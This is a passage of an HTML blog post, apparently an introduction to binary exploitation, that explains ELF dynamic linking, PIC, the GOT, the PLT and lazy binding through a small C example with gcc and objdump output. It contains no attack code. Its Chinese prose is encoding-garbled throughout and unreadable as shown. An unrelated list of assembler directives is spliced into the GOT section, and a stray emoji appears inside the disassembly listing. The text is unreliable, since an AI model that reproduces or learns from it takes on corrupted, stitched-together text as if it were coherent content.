çš„ç¨‹åºåœ¨è¿è¡Œæ—¶å¯ä»¥åŠ¨æ€åœ°é€‰æ‹©åŠ è½½å„ç§æ¨¡å—ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸å¸¸ä½¿ç”¨çš„æ’ä»¶ã€‚è½¯ä»¶çš„å¼€å‘å•†å¼€å‘æŸä¸ªäº§å“æ—¶ä¼šæŒ‰ç…§ä¸€å®šçš„è§„åˆ™åˆ¶å®šå¥½ç¨‹åºçš„æ¥å£ï¼Œå…¶ä»–å¼€å‘è€…å°±å¯ä»¥é€šè¿‡è¿™ç§æ¥å£æ¥ç¼–å†™ç¬¦åˆè¦æ±‚çš„åŠ¨æ€é“¾æ¥æ–‡ä»¶ï¼Œä»¥æ­¤æ¥å®ç°ç¨‹åºåŠŸèƒ½çš„æ‰©å±•ã€‚å¢å¼ºå…¼å®¹æ€§æ˜¯è¡¨ç°åœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„ç¨‹åºå¯¹ä¸åŒå¹³å°çš„ä¾èµ–å·®å¼‚æ€§é™ä½ï¼Œæ¯”å¦‚å¯¹æŸä¸ªå‡½æ•°çš„å®ç°æœºåˆ¶ä¸åŒï¼Œ<em>å¦‚æœæ˜¯ <strong>é™æ€é“¾æ¥</strong> çš„ç¨‹åºä¼šä¸ºä¸åŒå¹³å°å‘å¸ƒä¸åŒçš„ç‰ˆæœ¬ï¼Œè€Œåœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸åŒçš„å¹³å°éƒ½èƒ½æä¾›ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“åŒ…å«è¯¥å‡½æ•°ä¸”æ¥å£ç›¸åŒï¼Œå°±åªéœ€ç”¨ä¸€ä¸ªç‰ˆæœ¬äº†</em>ã€‚<br>æ€»è€Œè¨€ä¹‹ï¼Œ<strong>åŠ¨æ€é“¾æ¥</strong> çš„ç¨‹åºåœ¨è¿è¡Œæ—¶ä¼šæ ¹æ®è‡ªå·±æ‰€ä¾èµ–çš„ <strong>åŠ¨æ€é“¾æ¥åº“</strong> ï¼Œé€šè¿‡ <strong>åŠ¨æ€é“¾æ¥å™¨</strong> å°†ä»–ä»¬åŠ è½½è‡³å†…å­˜ä¸­ï¼Œå¹¶åœ¨æ­¤æ—¶å°†ä»–ä»¬é“¾æ¥æˆä¸€ä¸ªå®Œæ•´çš„ç¨‹åºã€‚<br>Linux ç³»ç»Ÿä¸­ï¼Œ<strong>ELF</strong> åŠ¨æ€é“¾æ¥æ–‡ä»¶è¢«ç§°ä¸º <strong>åŠ¨æ€å…±äº«å¯¹è±¡ï¼ˆDynamic Shared Objectsï¼‰</strong> ï¼Œ ç®€ç§° <strong>å…±äº«å¯¹è±¡</strong> ä¸€èˆ¬éƒ½æ˜¯ä»¥ â€œ<code>.so</code>â€ ä¸ºæ‰©å±•åçš„æ–‡ä»¶ï¼›åœ¨ windows ç³»ç»Ÿä¸­å°±æ˜¯å¸¸å¸¸è½¯ä»¶æŠ¥é”™ç¼ºå°‘<code>xxx.dll</code> æ–‡ä»¶ã€‚</p><h3 id="GOT-Global-offset-table"><a href="#GOT-Global-offset-table" class="headerlink" title="GOT(Global offset table)"></a>GOT(Global offset table)</h3><p><strong>å…±äº«å¯¹è±¡</strong> åœ¨è¢«è£…è½½æ—¶ï¼Œå¦‚ä½•ç¡®å®šå…¶åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Ÿ<br>è¦ä½¿ <strong>å…±äº«å¯¹è±¡</strong> èƒ½åœ¨ä»»æ„åœ°å€è£…è½½å°±éœ€è¦åˆ©ç”¨åˆ° <strong>è£…è½½æ—¶é‡å®šä½</strong> çš„æ€æƒ³ï¼Œå³åœ¨é“¾æ¥æ—¶å¯¹æ‰€æœ‰çš„ç»å¯¹åœ°å€çš„å¼•ç”¨ä¸åšé‡å®šä½è€Œå°†è¿™ä¸€æ­¥æ¨è¿Ÿåˆ°è£…è½½æ—¶å†å®Œæˆï¼Œä¸€æ—¦è£…è½½æ¨¡å—ç¡®å®šï¼Œç³»ç»Ÿå°±å¯¹æ‰€æœ‰çš„ç»å¯¹åœ°å€å¼•ç”¨è¿›è¡Œé‡å®šä½ã€‚ä½†æ˜¯éšä¹‹è€Œæ¥çš„é—®é¢˜æ˜¯ï¼ŒæŒ‡ä»¤éƒ¨åˆ†æ— æ³•åœ¨å¤šä¸ªè¿›ç¨‹ä¹‹é—´å…±äº«ï¼Œè¿™åˆäº§ç”Ÿäº†ä¸€ä¸ªæ–°çš„æŠ€æœ¯ <strong>åœ°å€æ— å…³ä»£ç  ï¼ˆPICï¼ŒPosition-independent Codeï¼‰</strong>ï¼Œè¯¥æŠ€æœ¯åŸºæœ¬æ€æƒ³å°±æ˜¯å°†æŒ‡ä»¤ä¸­éœ€è¦è¢«ä¿®æ”¹çš„éƒ¨åˆ†åˆ†ç¦»å‡ºæ¥æ”¾åœ¨æ•°æ®éƒ¨åˆ†ï¼Œè¿™æ ·å°±èƒ½ä¿è¯æŒ‡ä»¤éƒ¨åˆ†ä¸å˜ä¸”æ•°æ®éƒ¨åˆ†åˆå¯ä»¥åœ¨è¿›ç¨‹ç©ºé—´ä¸­ä¿ç•™ä¸€ä¸ªå‰¯æœ¬ï¼Œä¹Ÿå°±é¿å…äº†ä¸èƒ½èŠ‚çœç©ºé—´çš„æƒ…å†µã€‚é‚£ä¹ˆé‡æ–°å®šä½åçš„ç¨‹åºæ˜¯æ€ä¹ˆè¿›è¡Œæ•°æ®è®¿é—®å’Œå‡½æ•°è°ƒç”¨çš„å‘¢ï¼Ÿä¸‹é¢ç”¨å®é™…ä»£ç éªŒè¯ :</p><p>ç¼–å†™ä¸¤ä¸ªæ¨¡å—ï¼Œä¸€ä¸ªæ˜¯ç¨‹åºè‡ªèº«çš„ä»£ç æ¨¡å—ï¼Œå¦ä¸€ä¸ªæ˜¯å…±äº«å¯¹è±¡æ¨¡å—ã€‚ä»¥æ­¤æ¥å­¦ä¹ åŠ¨æ€é“¾æ¥çš„ç¨‹åºæ˜¯å¦‚ä½•è¿›è¡Œæ¨¡å—å†…ã€æ¨¡å—é—´çš„å‡½æ•°è°ƒç”¨å’Œæ•°æ®è®¿é—®<br><strong>ç¼–å†™å…±äº«æ–‡ä»¶</strong>å¦‚ä¸‹ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">got_extern.c #include &lt;stdio.h&gt;  int b;  void test()  &#123;  printf(&quot;test\n&quot;);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><strong>ç¼–è¯‘æˆ32ä½å…±äº«å¯¹è±¡æ–‡ä»¶</strong>ï¼š<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc got_extern.c -fPIC -shared -m32 -o got_extern.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><blockquote><p><code>-fPIC</code> é€‰é¡¹æ˜¯ç”Ÿæˆåœ°å€æ— å…³ä»£ç çš„ä»£ç ï¼Œgcc ä¸­è¿˜æœ‰å¦ä¸€ä¸ª -fpic é€‰é¡¹ï¼Œå·®åˆ«æ˜¯fPICäº§ç”Ÿçš„ä»£ç è¾ƒå¤§ä½†æ˜¯è·¨å¹³å°æ€§è¾ƒå¼ºè€Œfpicäº§ç”Ÿçš„ä»£ç è¾ƒå°ï¼Œä¸”ç”Ÿæˆé€Ÿåº¦æ›´å¿«ä½†æ˜¯åœ¨ä¸åŒå¹³å°ä¸­ä¼šæœ‰é™åˆ¶ã€‚ä¸€èˆ¬ä¼šé‡‡ç”¨fPICé€‰é¡¹<br><code>-shared</code> é€‰é¡¹æ˜¯ç”Ÿæˆå…±äº«å¯¹è±¡æ–‡ä»¶<br><code>-m32</code> é€‰é¡¹æ˜¯ç¼–è¯‘æˆ32ä½ç¨‹åº<br><code>-o</code> é€‰é¡¹æ˜¯å®šä¹‰è¾“å‡ºæ–‡ä»¶çš„åç§°</p></blockquote><p><strong>ç¼–å†™ä»£ç æ¨¡å—</strong>å¦‚ä¸‹<br><pre class="line-numbers language-c" data-language="c"><code class="language-c">got.c #include &lt;stdio.h&gt;    static int a;  extern int b;  extern void test();    int fun()  &#123;  a &#x3D; 1;  b &#x3D; 2;  &#125;    int main(int argc, char const *argv[])  &#123;  fun();  test();  printf(&quot;hey!&quot;);    return 0;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><strong>å’Œå…±äº«æ¨¡å—ä¸€åŒç¼–è¯‘</strong>ï¼š<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc got.c .&#x2F;got_extern.so -m32 -o got<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>ç”¨ <code>objdump</code> æŸ¥çœ‹åæ±‡ç¼–ä»£ç  <code>objdump -D -Mintel got</code>ï¼š<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">000011b9 &lt;fun&gt;:  11b9: 55 push ebp  11ba: 89 e5 mov ebp,esp  11bc: e8 63 00 00 00 call 1224 &lt;__x86.get_pc_thunk.ax&gt;  11c1: 05 3f 2e 00 00 add eax,0x2e3f  11c6: c7 80 24 00 00 00 01 mov DWORD PTR [eax+0x24],0x1  11cd: 00 00 00  11d0: 8b 80 ec ff ff ff mov eax,DWORD PTR [eax-0x14]  11d6: c7 00 02 00 00 00 mov DWORD PTR [eax],0x2  11dc: 90 nop  11dd: 5d pop ebp  11de: c3 ret    000011df &lt;main&gt;:  11df: 8d 4c 24 04 lea ecx,[esp+0x4]  11e3: 83 e4 f0 and esp,0xfffffff0  11e6: ff 71 fc push DWORD PTR [ecx-0x4]  11e9: 55 push ebp  11ea: 89 e5 mov ebp,esp  11ec: 53 push ebx  11ed: 51 push ecx  11ee: e8 cd fe ff ff call 10c0 &lt;__x86.get_pc_thunk.bx&gt;  11f3: 81 c3 0d 2e 00 00 add ebx,0x2e0d  11f9: e8 bb ff ff ff call 11b9 &lt;fun&gt; ğŸ¥’11fe: e8 5d fe ff ff call 1060 &lt;test@plt&gt;  1203: 83 ec 0c sub esp,0xc  1206: 8d 83 08 e0 ff ff lea eax,[ebx-0x1ff8]  120c: 50 push eax  120d: e8 2e fe ff ff call 1040 &lt;printf@plt&gt;  1212: 83 c4 10 add esp,0x10  1215: b8 00 00 00 00 mov eax,0x0  121a: 8d 65 f8 lea esp,[ebp-0x8]  121d: 59 pop ecx  121e: 5b pop ebx  121f: 5d pop ebp  1220: 8d 61 fc lea esp,[ecx-0x4]  1223: c3 ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h4 id="æ¨¡å—å†…éƒ¨è°ƒç”¨"><a href="#æ¨¡å—å†…éƒ¨è°ƒç”¨" class="headerlink" title="æ¨¡å—å†…éƒ¨è°ƒç”¨"></a>æ¨¡å—å†…éƒ¨è°ƒç”¨</h4><p>main()å‡½æ•°ä¸­è°ƒç”¨ fun()å‡½æ•° ï¼ŒæŒ‡ä»¤ä¸ºï¼š<br><pre class="line-numbers language-none"><code class="language-none">11f9:e8 bb ff ff ff       call   11b9 &lt;fun&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>fun() å‡½æ•°æ‰€åœ¨çš„åœ°å€ä¸º 0x000011b9 ï¼Œæœºå™¨ç  e8 ä»£è¡¨ call æŒ‡ä»¤ï¼Œä¸ºä»€ä¹ˆåé¢æ˜¯ bb ff ff ff è€Œä¸æ˜¯ b9 11 00 00 ï¼ˆå°ç«¯å­˜å‚¨ï¼‰å‘¢ï¼Ÿè¿™<em>åé¢çš„å››ä¸ªå­—èŠ‚ä»£è¡¨ç€ç›®çš„åœ°å€ç›¸å¯¹äºå½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€çš„åç§»</em>ï¼Œå³ 0x11f9 + 0x5 + (-69) = 0x11b9 ï¼Œ0xffffffbb æ˜¯ -69 çš„è¡¥ç å½¢å¼ï¼Œ<em>è¿™æ ·åšå°±å¯ä»¥ä½¿ç¨‹åºæ— è®ºè¢«è£…è½½åˆ°å“ªé‡Œéƒ½ä¼šæ­£å¸¸æ‰§è¡Œ</em>ã€‚</p><h4 id="æ¨¡å—å†…éƒ¨æ•°æ®è®¿é—®"><a href="#æ¨¡å—å†…éƒ¨æ•°æ®è®¿é—®" class="headerlink" title="æ¨¡å—å†…éƒ¨æ•°æ®è®¿é—®"></a>æ¨¡å—å†…éƒ¨æ•°æ®è®¿é—®</h4><p>ELF æ–‡ä»¶æ˜¯ç”±å¾ˆå¤šå¾ˆå¤šçš„ <strong>æ®µ(segment)</strong> æ‰€ç»„æˆï¼Œå¸¸è§çš„å°±å¦‚ .text (ä»£ç æ®µ) ã€.data(æ•°æ®æ®µï¼Œå­˜æ”¾å·²ç»åˆå§‹åŒ–çš„å…¨å±€å˜é‡æˆ–é™æ€å˜é‡)ã€.bss(æ•°æ®æ®µï¼Œå­˜æ”¾æœªåˆå§‹åŒ–å…¨å±€å˜é‡)ç­‰ï¼Œè¿™æ ·å°±èƒ½åšåˆ°æ•°æ®ä¸æŒ‡ä»¤åˆ†ç¦»äº’ä¸å¹²æ‰°ã€‚åœ¨åŒä¸€ä¸ªæ¨¡å—ä¸­ï¼Œä¸€èˆ¬å‰é¢çš„å†…å­˜åŒºåŸŸå­˜æ”¾ç€ä»£ç åé¢çš„åŒºåŸŸå­˜æ”¾ç€æ•°æ®(è¿™é‡ŒæŒ‡çš„æ˜¯ .data æ®µ)ã€‚<br><em>é‚£ä¹ˆæŒ‡ä»¤æ˜¯å¦‚ä½•è®¿é—®è¿œåœ¨ .data æ®µ ä¸­çš„æ•°æ®å‘¢?</em><br>è§‚å¯Ÿ fun() å‡½æ•°ä¸­ç»™é™æ€å˜é‡ a èµ‹å€¼çš„æŒ‡ä»¤ï¼š<br><pre class="line-numbers language-none"><code class="language-none">11bc: e8 63 00 00 00 call 1224 &lt;__x86.get_pc_thunk.ax&gt;  11c1: 05 3f 2e 00 00 add eax,0x2e3f  11c6: c7 80 24 00 00 00 01 mov DWORD PTR [eax+0x24],0x1  11cd: 00 00 00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>ä»ä¸Šé¢çš„æŒ‡ä»¤ä¸­å¯ä»¥çœ‹å‡ºï¼Œå®ƒå…ˆè°ƒç”¨äº† <code>__x86.get_pc_thunk.ax()</code>å‡½æ•°ï¼š<br><pre class="line-numbers language-none"><code class="language-none">00001224 &lt;__x86.get_pc_thunk.ax&gt;:  1224: 8b 04 24 mov eax,DWORD PTR [esp]  1227: c3 ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯æŠŠè¿”å›åœ°å€çš„å€¼æ”¾åˆ° eax å¯„å­˜å™¨ä¸­ï¼Œä¹Ÿå°±æ˜¯æŠŠ0x000011c1ä¿å­˜åˆ°eaxä¸­ï¼Œç„¶åå†åŠ ä¸Š 0x2e3f ï¼Œæœ€åå†åŠ ä¸Š 0x24 ã€‚å³ 0x000011c1 + 0x2e3f + 0x24 = 0x4024ï¼Œè¿™ä¸ªå€¼å°±æ˜¯ç›¸å¯¹äºæ¨¡å—åŠ è½½åŸºå€çš„å€¼ã€‚é€šè¿‡è¿™æ ·å°±èƒ½è®¿é—®åˆ°æ¨¡å—å†…éƒ¨çš„æ•°æ®ã€‚<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250124150617.png" alt="Pasted image 20250124150617"></p><h4 id="æ¨¡å—é—´æ•°æ®è®¿é—®"><a href="#æ¨¡å—é—´æ•°æ®è®¿é—®" class="headerlink" title="æ¨¡å—é—´æ•°æ®è®¿é—®"></a>æ¨¡å—é—´æ•°æ®è®¿é—®</h4><p>å˜é‡ b è¢«å®šä¹‰åœ¨å…¶ä»–æ¨¡å—ä¸­ï¼Œå…¶åœ°å€éœ€è¦åœ¨ç¨‹åºè£…è½½æ—¶æ‰èƒ½å¤Ÿç¡®å®šã€‚åˆ©ç”¨åˆ°å‰é¢çš„ä»£ç åœ°å€æ— å…³çš„æ€æƒ³ï¼ŒæŠŠåœ°å€ç›¸å…³çš„éƒ¨åˆ†æ”¾å…¥æ•°æ®æ®µä¸­ï¼Œç„¶è€Œè¿™é‡Œçš„å˜é‡ b çš„åœ°å€ä¸å…¶è‡ªèº«æ‰€åœ¨çš„æ¨¡å—è£…è½½çš„åœ°å€æœ‰å…³ã€‚è§£å†³ï¼šELF ä¸­åœ¨æ•°æ®æ®µé‡Œé¢å»ºç«‹äº†ä¸€ä¸ª<strong>æŒ‡å‘è¿™äº›å˜é‡çš„æŒ‡é’ˆæ•°ç»„</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„ <strong>GOT è¡¨(Global offset Tableï¼Œ å…¨å±€åç§»è¡¨ ï¼‰</strong>ï¼Œå®ƒçš„åŠŸèƒ½å°±æ˜¯å½“ä»£ç éœ€è¦å¼•ç”¨å…¨å±€å˜é‡æ—¶ï¼Œå¯ä»¥é€šè¿‡ GOT è¡¨é—´æ¥å¼•ç”¨ã€‚</p><p>æŸ¥çœ‹åæ±‡ç¼–ä»£ç ä¸­æ˜¯å¦‚ä½•è®¿é—®å˜é‡ b çš„ï¼š<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">11bc: e8 63 00 00 00 call 1224 &lt;__x86.get_pc_thunk.ax&gt;  11c1: 05 3f 2e 00 00 add eax,0x2e3f  11c6: c7 80 24 00 00 00 01 mov DWORD PTR [eax+0x24],0x1  11cd: 00 00 00  11d0: 8b 80 ec ff ff ff mov eax,DWORD PTR [eax-0x14]  11d6: c7 00 02 00 00 00 mov DWORD PTR [eax],0x2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>è®¡ç®—å˜é‡ b åœ¨ GOT è¡¨ä¸­çš„ä½ç½®ï¼Œ0x11c1 + 0x2e3f - 0x14 = 0x3fec ï¼ŒæŸ¥çœ‹ GOT è¡¨çš„ä½ç½®ã€‚</p><p>å‘½ä»¤ objdump -h got ï¼ŒæŸ¥çœ‹ELFæ–‡ä»¶ä¸­çš„èŠ‚å¤´å†…å®¹ï¼š<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">21 .got 00000018 00003fe8 00003fe8 00002fe8 2**2  CONTENTS, ALLOC, LOAD, DATA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>è¿™é‡Œå¯ä»¥çœ‹åˆ° .got åœ¨æ–‡ä»¶ä¸­çš„åç§»æ˜¯ 0x00003fe8ï¼Œç°åœ¨æ¥çœ‹åœ¨åŠ¨æ€è¿æ¥æ—¶éœ€è¦é‡å®šä½çš„é¡¹ï¼Œä½¿ç”¨ <code>objdump -R got</code>å‘½ä»¤<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">00003fec R_386_GLOB_DAT    b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>xxxxxxxxxx7 1        ã€€ã€€DW      å®šä¹‰å­—(2å­—èŠ‚).  2        PROC    å®šä¹‰è¿‡ç¨‹.  3        ENDP    è¿‡ç¨‹ç»“æŸ.  4        SEGMENT å®šä¹‰æ®µ.  5        ASSUME  å»ºç«‹æ®µå¯„å­˜å™¨å¯»å€.  6        ENDS    æ®µç»“æŸ.  7        END    ç¨‹åºç»“æŸ.C</p><h4 id="æ¨¡å—é—´å‡½æ•°è°ƒç”¨"><a href="#æ¨¡å—é—´å‡½æ•°è°ƒç”¨" class="headerlink" title="æ¨¡å—é—´å‡½æ•°è°ƒç”¨"></a>æ¨¡å—é—´å‡½æ•°è°ƒç”¨</h4><p>æ¨¡å—é—´å‡½æ•°è°ƒç”¨ç”¨åˆ°äº†å»¶è¿Ÿç»‘å®šï¼Œéƒ½æ˜¯å‡½æ•°å@pltçš„å½¢å¼<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">11fe:e8 5d fe ff ff       call   1060 &lt;test@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="å»¶è¿Ÿç»‘å®š-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table"><a href="#å»¶è¿Ÿç»‘å®š-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table" class="headerlink" title="å»¶è¿Ÿç»‘å®š(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)"></a>å»¶è¿Ÿç»‘å®š(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)</h3><p><strong>å› ä¸º<em>åŠ¨æ€é“¾æ¥</em>çš„ç¨‹åºæ˜¯åœ¨è¿è¡Œæ—¶éœ€è¦å¯¹å…¨å±€å’Œé™æ€æ•°æ®è®¿é—®è¿›è¡ŒGOTå®šä½ï¼Œç„¶åé—´æ¥å¯»å€ã€‚åŒæ ·ï¼Œå¯¹äºæ¨¡å—é—´çš„è°ƒç”¨ä¹Ÿéœ€è¦GOTå®šä½ï¼Œå†æ‰é—´æ¥è·³è½¬</strong>ï¼Œè¿™ä¹ˆåšåŠ¿å¿…ä¼šå½±å“åˆ°ç¨‹åºçš„è¿è¡Œé€Ÿåº¦ã€‚è€Œä¸”ç¨‹åºåœ¨è¿è¡Œæ—¶å¾ˆå¤§ä¸€éƒ¨åˆ†å‡½æ•°éƒ½å¯èƒ½ç”¨ä¸åˆ°ï¼Œäºæ˜¯ELFé‡‡ç”¨äº†å½“å‡½æ•°ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶æ‰è¿›è¡Œç»‘å®šçš„æ€æƒ³ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„ <strong>å»¶è¿Ÿç»‘å®š</strong>ã€‚ELFå®ç° <strong>å»¶è¿Ÿç»‘å®š</strong> æ˜¯é€šè¿‡ <strong>PLT</strong> ï¼Œ<strong>åŸå…ˆ GOT ä¸­å­˜æ”¾ç€å…¨å±€å˜é‡å’Œå‡½æ•°è°ƒç”¨ï¼Œç°åœ¨æŠŠä»–æ‹†æˆå¦ä¸ªéƒ¨åˆ† .got å’Œ .got.pltï¼Œç”¨ .got å­˜æ”¾ç€å…¨å±€å˜é‡å¼•ç”¨ï¼Œç”¨ .got.plt å­˜æ”¾ç€å‡½æ•°å¼•ç”¨</strong>ã€‚<br>æŸ¥çœ‹ test@plt ä»£ç ï¼Œç”¨ <code>objdump -Mintel -d -j .plt got</code></p><blockquote><p>-Mintel é€‰é¡¹æŒ‡å®š intel æ±‡ç¼–è¯­æ³•<br>-d é€‰é¡¹å±•ç¤ºå¯æ‰§è¡Œæ–‡ä»¶èŠ‚çš„æ±‡ç¼–å½¢å¼<br>-j é€‰é¡¹åé¢è·Ÿä¸ŠèŠ‚åï¼ŒæŒ‡å®šèŠ‚</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">00001060 &lt;test@plt&gt;:  1060: ff a3 14 00 00 00 jmp DWORD PTR [ebx+0x14]  1066: 68 10 00 00 00 push 0x10  106b: e9 c0 ff ff ff jmp 1030 &lt;.plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹ main()å‡½æ•° ä¸­è°ƒç”¨ test@plt çš„åæ±‡ç¼–ä»£ç <br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">11ee: e8 cd fe ff ff call 10c0 &lt;__x86.get_pc_thunk.bx&gt;  11f3: 81 c3 0d 2e 00 00 add ebx,0x2e0d  11f9: e8 bb ff ff ff call 11b9 &lt;fun&gt;  11fe: e8 5d fe ff ff call 1060 &lt;test@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><p><code>__x86.gett_pc_thunk.bx</code>å‡½æ•°ä¸ä¹‹å‰çš„ <code>__x86.get_pc_thunk.ax</code>åŠŸèƒ½ä¸€æ · ï¼Œå¾—å‡º ebx = 0x11f3 + 0x2e0d = 0x4000 ï¼Œebx + 0x14 = 0x4014 ã€‚é¦–å…ˆ jmp æŒ‡ä»¤ï¼Œè·³è½¬åˆ° 0x4014 è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€åœ¨ .got.plt èŠ‚ä¸­ ï¼š<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250125134945.png" alt="Pasted image 20250125134945"><br>ä¹Ÿå°±æ˜¯å½“ç¨‹åºéœ€è¦è°ƒç”¨åˆ°å…¶ä»–æ¨¡å—ä¸­çš„å‡½æ•°æ—¶ä¾‹å¦‚ fun() ï¼Œå°±å»è®¿é—®ä¿å­˜åœ¨ .got.plt ä¸­çš„ fun@plt ã€‚è¿™é‡Œæœ‰ä¸¤ç§æƒ…å†µï¼Œç¬¬ä¸€ç§å°±æ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªåœ°æ–¹å°±å­˜æ”¾ç€ç¬¬äºŒæ¡æŒ‡ä»¤çš„åœ°å€ï¼Œä¹Ÿå°±ç›¸å½“äºä»€ä¹ˆéƒ½ä¸åšã€‚<br>ç”¨ <code>objdump -d -s got -j .got.plt</code> å‘½ä»¤æŸ¥çœ‹èŠ‚ä¸­çš„å†…å®¹</p><blockquote><p>-s å‚æ•°æ˜¾ç¤ºæŒ‡å®šèŠ‚çš„æ‰€æœ‰å†…å®¹<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250125135018.png" alt="Pasted image 20250125135018"></p></blockquote><p>4014 å¤„å­˜æ”¾ç€ 66 10 00 00 ï¼Œå› ä¸ºæ˜¯å°ç«¯åºæ‰€ä»¥åº”ä¸º 0x00001066ï¼Œè¿™ä¸ªä½ç½®åˆšå¥½å¯¹åº”ç€ push 0x10 è¿™æ¡æŒ‡ä»¤ï¼Œè¿™ä¸ªå€¼æ˜¯ test è¿™ä¸ªç¬¦å·åœ¨ .rel.plt èŠ‚ä¸­çš„ä¸‹æ ‡ã€‚ç»§ç»­ jmp æŒ‡ä»¤è·³åˆ° .plt å¤„<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250125135342.png" alt="Pasted image 20250125135342"><br>push DWORD PTR [ebx + 0x4] æŒ‡ä»¤æ˜¯å°†å½“å‰æ¨¡å—IDå‹æ ˆï¼Œä¹Ÿå°±æ˜¯ got.c æ¨¡å—ï¼Œæ¥ç€ jmp DWORD PTR [ebx + 0x8] ï¼Œè¿™ä¸ªæŒ‡ä»¤å°±æ˜¯è·³è½¬åˆ° <strong>åŠ¨æ€é“¾æ¥å™¨</strong> ä¸­çš„ <code>_dl_runtime_resolve</code>å‡½æ•°ä¸­å»ã€‚è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯åœ¨å¦å¤–çš„æ¨¡å—ä¸­æŸ¥æ‰¾éœ€è¦çš„å‡½æ•°ï¼Œå°±æ˜¯è¿™é‡Œçš„åœ¨ got_extern.so æ¨¡å—ä¸­çš„ test å‡½æ•°ã€‚<br>ç„¶å<code>_dl_runtime_resolve</code>å‡½æ•°ä¼šå°† test() å‡½æ•°çš„çœŸæ­£åœ°å€å¡«å…¥åˆ° test@got ä¸­å»ä¹Ÿå°±æ˜¯ .got.plt èŠ‚ä¸­ã€‚<br>é‚£ä¹ˆç¬¬äºŒç§æƒ…å†µå°±æ˜¯ï¼Œå½“ç¬¬äºŒæ¬¡è°ƒç”¨test()@plt å‡½æ•°æ—¶ï¼Œå°±ä¼šé€šè¿‡ç¬¬ä¸€æ¡æŒ‡ä»¤è·³è½¬åˆ°çœŸæ­£çš„å‡½æ•°åœ°å€ã€‚æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯æ‰€è¯´çš„é€šè¿‡ <strong>plt</strong> æ¥å®ç° <strong>å»¶è¿Ÿç»‘å®š</strong> ã€‚ç¨‹åºè°ƒç”¨å¤–éƒ¨å‡½æ•°çš„æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯ï¼Œç¬¬ä¸€æ¬¡è®¿é—® test@plt å‡½æ•°æ—¶ï¼Œ<strong>åŠ¨æ€é“¾æ¥å™¨</strong>å°±ä¼šå»åŠ¨æ€å…±äº«æ¨¡å—ä¸­æŸ¥æ‰¾ test å‡½æ•°çš„çœŸå®åœ°å€ç„¶åå°†çœŸå®åœ°å€ä¿å­˜åˆ°test@gotä¸­(.got.plt)ï¼›ç¬¬äºŒæ¬¡è®¿é—®test@pltæ—¶ï¼Œå°±ç›´æ¥è·³è½¬åˆ°test@gotä¸­å»ã€‚</p><h3 id="ç®€ä¾‹"><a href="#ç®€ä¾‹" class="headerlink" title="ç®€ä¾‹"></a>ç®€ä¾‹</h3><pre class="line-numbers language-C" 